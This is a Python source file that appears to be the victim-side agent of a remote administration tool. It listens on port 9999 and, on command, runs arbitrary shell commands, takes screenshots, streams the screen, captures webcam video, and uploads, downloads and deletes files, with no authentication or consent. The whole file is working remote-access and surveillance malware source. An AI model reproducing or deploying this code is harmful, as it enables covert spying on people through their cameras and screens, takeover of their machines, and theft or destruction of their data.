#copyright © 2019-2023 manoharkakumani
import socket
import os
import subprocess
import shutil
import pickle
import struct
import pyautogui
import cv2
import numpy
from PIL import ImageGrab

port = 9999

# Create a Socket
def create_socket():
    try:
        global host
        global s
        host = ""
        s = socket.socket()
    except socket.error as msg:
        create_socket()

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
           bind_socket()

#shell
def shell(data,conn):
    try:
        if data[:2]== 'cd':
            os.chdir(data[3:])
        if len(data) > 0:
            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            conn.send(str.encode(output_str + currentWD))
    except Exception as e:
        conn.send(e.encode("utf-8"))

#screenshot
def sshot(conn):
    try:
        conn.send(('OK').encode("utf-8"))
        pic = pyautogui.screenshot()
        pic.save('myssdd.png')
        fup('myssdd.png',conn)
        os.unlink('myssdd.png')
    except Exception as e:
        conn.send(e.encode("utf-8"))

#screen_streaming
def stream(conn): 
    try: 
        conn.send(('OK').encode("utf-8"))
        while True:
            if conn.recv(4096).decode('utf-8')=="sst":
                frame = numpy.array(ImageGrab.grab())
                result, frame = cv2.imencode('.jpg', frame)
                data = pickle.dumps(frame, 0)
                size = len(data)
                conn.sendall(struct.pack(">L", size) + data)
            else:
                break
        return
    except Exception as e:
        conn.send(e.encode("utf-8"))

#camera
def cam(conn):
    try:
        conn.send(('OK').encode("utf-8"))
        cam = cv2.VideoCapture(0)
        if cam :
            conn.send(('cam').encode("utf-8"))
            while True:
                if conn.recv(4096).decode('utf-8')=="cam":
                    ret, frame = cam.read()
                    result, frame = cv2.imencode('.jpg', frame)
                    data = pickle.dumps(frame,0)
                    conn.sendall(struct.pack(">L", len(data)) + data)
                else:
                    cam.release()
                    break
            return
        else:
            conn.send(('No camera Found').encode("utf-8"))
    except Exception as e:
        conn.send(e.encode("utf-8"))

    
# send file list

def flist(conn):
    try:
        arr = pickle.dumps(os.listdir())
        conn.send(arr)
    except:
        conn.send(('Error').encode("utf-8"))

# dir change
    
def cdir(conn):
    try:
        conn.send((os.getcwd()).encode("utf-8"))
        x=conn.recv(1024).decode("utf-8")
        if x=='Y':
           dire=conn.recv(1024).decode("utf-8")
           os.chdir(dire)
           conn.send((os.getcwd()).encode("utf-8"))
        else:
            return
    except Exception as e:
        conn.send(e.encode("utf-8"))
    
#accept file from server
    
def fdown(filename,conn):
    try:
        data = conn.recv(1024).decode("utf-8")
        if data[:6] == 'EXISTS':
            filesize = data[6:]
            conn.send("OK".encode("utf-8"))
            f = open(filename, 'wb')
            data = (conn.recv(1024))
            totalRecv = len(data)
            f.write(data)
            while int(totalRecv) < int(filesize):
                data = conn.recv(1024)
                totalRecv += len(data)
                f.write(data)
            f.close()
    except Exception as e:
        conn.send(e.encode("utf-8"))
#send file
        
def fup(filename, conn):
    try:
        if os.path.isfile(filename):
            conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
            filesize=int(os.path.getsize(filename))
            userResponse = conn.recv(1024).decode("utf-8")
            if userResponse[:2] == 'OK':
                with open(filename, 'rb') as f:
                    bytesToSend = f.read(1024)
                    conn.send(bytesToSend)
                    totalSend=len(bytesToSend)
                    while int (totalSend) < int(filesize):
                        bytesToSend = f.read(1024)
                        totalSend += len(bytesToSend)
                        conn.send(bytesToSend)
        else:
            conn.send("ERROR".encode("utf-8"))
    except Exception as e:
        conn.send(e.encode("utf-8"))

# delete files

def fdel(fname,conn):
    try:
        if os.path.isfile(fname):
            os.unlink(fname)
        elif os.path.isdir(fname):
            shutil.rmtree(fname)
        else:
            conn.send("ERROR".encode("utf-8"))
        conn.send("Success".encode("utf-8"))
    except Exception as e:
        conn.send(e.encode("utf-8"))
#main
def main(s):
    while True:
        data = (s.recv(1024)).decode("utf-8").split('~')
        if data[0]=='cmd':
            shell(data[1],s)
        elif data[0]=='fdown':
            fup(data[1],s)
        elif data[0]=='fup':
            fdown(data[1],s)
        elif data[0]=='cdir':
            cdir(s)
        elif data[0]=='flist':
            flist(s)
        elif data[0]=='fdel':
            fdel(data[1],s)
        elif data[0]=='sshot':
            sshot(s)
        elif data[0]=='cam':
            cam(s)
        elif data[0]=='sst':
            stream(s)
        elif data[0]=='cwd':
            s.send((os.getcwd()).encode("utf-8"))
        elif data[0]=='back':
            s.close()
            return "back"
        elif data[0]=='exit':
            s.close()
            return "exit"
        else:
            s.send(".".encode('utf-8'))


# Establish connection with a host (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    return main(conn)
create_socket()
bind_socket()
while socket_accept()=="back":continue
